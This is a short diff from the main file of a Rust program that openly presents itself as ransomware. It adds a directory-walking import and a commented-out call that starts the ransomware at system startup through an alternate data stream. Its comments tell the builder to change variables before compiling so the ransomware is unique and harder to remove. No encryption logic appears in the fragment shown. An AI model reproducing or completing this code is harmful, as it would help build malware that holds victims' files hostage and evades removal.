@@ -13,8 +13,12 @@ use std::process::Command;
 use std::thread;
 use std::time;
 use system_changer::registry_changer;
+use walkdir::WalkDir;
 
 fn main() {
+    /*
+    registry_changer::start_ransomware_on_startup_alternate_data_stream();
+    fs::write("yes.txt", "Contentssss");*/
     // Global vars used in the bellow code, CHANGE BEFORE COMPILING AS THEY ARE SUPPOSED TO BE UNIQUE.
     // Note that if you want to make the ransomware more unique and harder to be removed you should go in other files and change other settings
     // A guide in the README.md on how to make this more random and secure should be coming soon.
